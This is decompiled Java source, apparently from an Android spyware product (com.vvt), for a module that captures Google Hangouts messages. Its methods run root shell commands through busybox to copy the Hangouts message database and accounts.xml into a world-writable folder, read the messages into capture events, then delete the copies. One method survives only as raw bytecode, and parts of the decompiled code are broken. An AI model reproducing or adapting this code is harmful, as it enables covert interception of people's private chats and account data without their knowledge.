package com.vvt.capture.hangouts.c;

import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.hangouts.d;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class c
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.d;
  private static final boolean c = com.vvt.ak.a.e;
  private long d = -1;
  private String e;
  private com.vvt.base.b f;
  
  public c(String paramString, com.vvt.base.b paramb)
  {
    this.e = paramString;
    this.f = paramb;
  }
  
  public static String a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    String str1 = p.a(paramString3, "babel.db");
    try
    {
      bool = ShellUtil.b(paramString3);
      if (!bool)
      {
        bool = a;
        if (bool) {}
        str2 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
        i = 5;
        arrayOfObject = new Object[i];
        j = 0;
        arrayOfObject[0] = paramString3;
        j = 1;
        arrayOfObject[j] = paramString3;
        j = 2;
        arrayOfObject[j] = paramString2;
        j = 3;
        arrayOfObject[j] = paramString2;
        j = 4;
        arrayOfObject[j] = paramString3;
        str2 = String.format(str2, arrayOfObject);
        KMShell.a(str2);
        bool = com.vvt.aa.a.c();
        if (bool) {
          ShellUtil.k(paramString3);
        }
      }
      String str2 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
      int i = 7;
      Object[] arrayOfObject = new Object[i];
      int j = 0;
      arrayOfObject[0] = paramString4;
      j = 1;
      arrayOfObject[j] = paramString1;
      j = 2;
      arrayOfObject[j] = str1;
      j = 3;
      arrayOfObject[j] = str1;
      j = 4;
      arrayOfObject[j] = paramString2;
      j = 5;
      arrayOfObject[j] = paramString2;
      j = 6;
      arrayOfObject[j] = str1;
      str2 = String.format(str2, arrayOfObject);
      KMShell.a(str2);
      bool = com.vvt.aa.a.c();
      if (bool) {
        ShellUtil.k(str1);
      }
      bool = a;
      if (!bool) {}
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool = c;
        if (!bool) {}
      }
    }
    return str1;
  }
  
  public static String b(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    String str1 = p.a(paramString3, "accounts.xml");
    try
    {
      bool = ShellUtil.b(paramString3);
      if (!bool)
      {
        bool = a;
        if (bool) {}
        str2 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
        i = 5;
        arrayOfObject = new Object[i];
        j = 0;
        arrayOfObject[0] = paramString3;
        j = 1;
        arrayOfObject[j] = paramString3;
        j = 2;
        arrayOfObject[j] = paramString2;
        j = 3;
        arrayOfObject[j] = paramString2;
        j = 4;
        arrayOfObject[j] = paramString3;
        str2 = String.format(str2, arrayOfObject);
        KMShell.a(str2);
      }
      bool = com.vvt.aa.a.c();
      if (bool) {
        ShellUtil.k(paramString3);
      }
      String str2 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
      int i = 7;
      Object[] arrayOfObject = new Object[i];
      int j = 0;
      arrayOfObject[0] = paramString4;
      j = 1;
      arrayOfObject[j] = paramString1;
      j = 2;
      arrayOfObject[j] = str1;
      j = 3;
      arrayOfObject[j] = str1;
      j = 4;
      arrayOfObject[j] = paramString2;
      j = 5;
      arrayOfObject[j] = paramString2;
      j = 6;
      arrayOfObject[j] = str1;
      str2 = String.format(str2, arrayOfObject);
      KMShell.a(str2);
      bool = com.vvt.aa.a.c();
      if (bool) {
        ShellUtil.k(str1);
      }
      bool = a;
      if (!bool) {}
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool = c;
        if (!bool) {}
      }
    }
    return str1;
  }
  
  private String d()
  {
    return p.a(b(), "busybox");
  }
  
  private String e()
  {
    return p.a(this.e, "hangouts");
  }
  
  private void f()
  {
    String str1 = e();
    String str2 = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = c;
        if (!bool) {}
      }
    }
  }
  
  /* Error */
  public g a()
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_1
    //   3: getstatic 21	com/vvt/capture/hangouts/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:a	Z
    //   6: istore_3
    //   7: iload_3
    //   8: ifeq +3 -> 11
    //   11: invokestatic 102	com/vvt/n/a/removeFromPath/removeFromPath:removeFromPath	()Ljava/lang/String;
    //   14: astore 4
    //   16: getstatic 21	com/vvt/capture/hangouts/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:a	Z
    //   19: istore 5
    //   21: iload 5
    //   23: ifeq +3 -> 26
    //   26: aload 4
    //   28: ifnull +220 -> 248
    //   31: aload_0
    //   32: invokespecial 95	com/vvt/capture/hangouts/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:e	()Ljava/lang/String;
    //   35: astore 6
    //   37: aload_0
    //   38: invokespecial 104	com/vvt/capture/hangouts/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:d	()Ljava/lang/String;
    //   41: astore 7
    //   43: aload_0
    //   44: getfield 39	com/vvt/capture/hangouts/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:f	Lcom/vvt/base/removeFromPath;
    //   47: astore 8
    //   49: aload 8
    //   51: invokevirtual 108	com/vvt/base/removeFromPath:f	()Ljava/lang/String;
    //   54: astore 8
    //   56: aload 4
    //   58: aload 8
    //   60: aload 6
    //   62: aload 7
    //   64: invokestatic 111	com/vvt/capture/hangouts/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:removeFromPath	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   67: astore 4
    //   69: getstatic 21	com/vvt/capture/hangouts/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:a	Z
    //   72: istore 9
    //   74: iload 9
    //   76: ifeq +3 -> 79
    //   79: aload 4
    //   81: invokestatic 112	com/vvt/n/a/removeFromPath/removeFromPath:a	(Ljava/lang/String;)Ljava/lang/String;
    //   84: astore 4
    //   86: getstatic 21	com/vvt/capture/hangouts/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:a	Z
    //   89: istore 9
    //   91: iload 9
    //   93: ifeq +3 -> 96
    //   96: aload 4
    //   98: ifnull +144 -> 242
    //   101: aload_0
    //   102: getfield 39	com/vvt/capture/hangouts/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:f	Lcom/vvt/base/removeFromPath;
    //   105: astore 8
    //   107: aload 8
    //   109: invokevirtual 108	com/vvt/base/removeFromPath:f	()Ljava/lang/String;
    //   112: astore 8
    //   114: aload 4
    //   116: aload 8
    //   118: aload 6
    //   120: aload 7
    //   122: invokestatic 114	com/vvt/capture/hangouts/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   125: astore 4
    //   127: aload 4
    //   129: invokestatic 118	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   132: istore 5
    //   134: iload 5
    //   136: ifne +106 -> 242
    //   139: aload 4
    //   141: invokestatic 123	com/vvt/capture/hangouts/d:a	(Ljava/lang/String;)J
    //   144: lstore 10
    //   146: aload_0
    //   147: invokespecial 125	com/vvt/capture/hangouts/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:f	()V
    //   150: lload 10
    //   152: lload_1
    //   153: lcmp
    //   154: istore 12
    //   156: iload 12
    //   158: ifne +70 -> 228
    //   161: getstatic 25	com/vvt/capture/hangouts/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:removeFromPath	Z
    //   164: istore_3
    //   165: iload_3
    //   166: ifeq +3 -> 169
    //   169: aload_0
    //   170: getfield 35	com/vvt/capture/hangouts/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:d	J
    //   173: lstore 10
    //   175: new 127	com/vvt/base/capture/FxSimpleEventReference
    //   178: astore 13
    //   180: aload 13
    //   182: invokespecial 128	com/vvt/base/capture/FxSimpleEventReference:<init>	()V
    //   185: lload 10
    //   187: invokestatic 134	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   190: astore 4
    //   192: aload 13
    //   194: aload 4
    //   196: invokevirtual 138	com/vvt/base/capture/FxSimpleEventReference:setReference	(Ljava/lang/Long;)V
    //   199: getstatic 21	com/vvt/capture/hangouts/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:a	Z
    //   202: istore_3
    //   203: iload_3
    //   204: ifeq +3 -> 207
    //   207: aload 13
    //   209: areturn
    //   210: astore 4
    //   212: lload_1
    //   213: lstore 10
    //   215: getstatic 29	com/vvt/capture/hangouts/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   218: istore 14
    //   220: iload 14
    //   222: ifeq -72 -> 150
    //   225: goto -75 -> 150
    //   228: aload_0
    //   229: lload 10
    //   231: putfield 35	com/vvt/capture/hangouts/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:d	J
    //   234: goto -59 -> 175
    //   237: astore 7
    //   239: goto -24 -> 215
    //   242: lload_1
    //   243: lstore 10
    //   245: goto -99 -> 146
    //   248: lload_1
    //   249: lstore 10
    //   251: goto -101 -> 150
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	254	0	this	MyUncaughtExceptionHandler
    //   2	247	1	l1	long
    //   6	198	3	bool1	boolean
    //   14	181	4	localObject1	Object
    //   210	1	4	localException1	Exception
    //   19	116	5	bool2	boolean
    //   35	84	6	str1	String
    //   41	80	7	str2	String
    //   237	1	7	localException2	Exception
    //   47	70	8	localObject2	Object
    //   72	20	9	bool3	boolean
    //   144	106	10	l2	long
    //   154	3	12	bool4	boolean
    //   178	30	13	localFxSimpleEventReference	FxSimpleEventReference
    //   218	3	14	bool5	boolean
    // Exception table:
    //   from	to	target	type
    //   11	14	210	java/lang/Exception
    //   16	19	210	java/lang/Exception
    //   31	35	210	java/lang/Exception
    //   37	41	210	java/lang/Exception
    //   43	47	210	java/lang/Exception
    //   49	54	210	java/lang/Exception
    //   62	67	210	java/lang/Exception
    //   69	72	210	java/lang/Exception
    //   79	84	210	java/lang/Exception
    //   86	89	210	java/lang/Exception
    //   101	105	210	java/lang/Exception
    //   107	112	210	java/lang/Exception
    //   120	125	210	java/lang/Exception
    //   127	132	210	java/lang/Exception
    //   139	144	210	java/lang/Exception
    //   146	150	237	java/lang/Exception
  }
  
  public List a(int paramInt)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject1 = com.vvt.n.a.b.b.b();
      boolean bool2 = a;
      if ((!bool2) || (localObject1 != null))
      {
        String str1 = e();
        String str2 = d();
        Object localObject2 = this.f;
        localObject2 = ((com.vvt.base.b)localObject2).f();
        String str3 = b((String)localObject1, (String)localObject2, str1, str2);
        bool1 = a;
        if (bool1) {}
        localObject1 = com.vvt.n.a.b.b.a(str3);
        boolean bool3 = a;
        if ((!bool3) || (localObject1 != null))
        {
          localObject2 = this.f;
          localObject2 = ((com.vvt.base.b)localObject2).f();
          localObject1 = a((String)localObject1, (String)localObject2, str1, str2);
          bool2 = a;
          if (bool2) {}
          long l1 = d.a(paramInt, (String)localObject1);
          long l2 = 1L;
          long l3 = l1 - l2;
          long l4 = d.a((String)localObject1);
          bool2 = a;
          if (bool2) {}
          str1 = this.e;
          com.vvt.base.b localb = this.f;
          localObject1 = d.a((String)localObject1, str1, l3, l4, str3, localb);
          localArrayList.addAll((Collection)localObject1);
          bool1 = a;
          if (!bool1) {}
        }
        f();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool1 = c;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramg1 instanceof FxSimpleEventReference;
    if (bool1)
    {
      bool1 = paramg2 instanceof FxSimpleEventReference;
      if (!bool1) {}
    }
    try
    {
      Object localObject1 = ((g)paramg1).getReference();
      localObject1 = (Long)localObject1;
      long l1 = ((Long)localObject1).longValue();
      localObject1 = ((g)paramg2).getReference();
      localObject1 = (Long)localObject1;
      long l2 = ((Long)localObject1).longValue();
      localObject1 = com.vvt.n.a.b.b.b();
      boolean bool2 = a;
      if ((!bool2) || (localObject1 != null))
      {
        String str = e();
        Object localObject2 = d();
        Object localObject3 = this.f;
        localObject3 = ((com.vvt.base.b)localObject3).f();
        localObject3 = b((String)localObject1, (String)localObject3, str, (String)localObject2);
        bool1 = a;
        if (bool1) {}
        localObject1 = com.vvt.n.a.b.b.a((String)localObject3);
        boolean bool3 = a;
        if ((!bool3) || (localObject1 != null))
        {
          Object localObject4 = this.f;
          localObject4 = ((com.vvt.base.b)localObject4).f();
          localObject1 = a((String)localObject1, (String)localObject4, str, (String)localObject2);
          bool2 = a;
          if (bool2) {}
          str = this.e;
          localObject2 = this.f;
          localObject1 = d.a((String)localObject1, str, l1, l2, (String)localObject3, (com.vvt.base.b)localObject2);
          localArrayList.addAll((Collection)localObject1);
          bool1 = a;
          if (!bool1) {}
        }
        f();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool1 = c;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
  
  public String b()
  {
    return this.e;
  }
  
  public void c()
  {
    this.d = -1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/hangouts/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */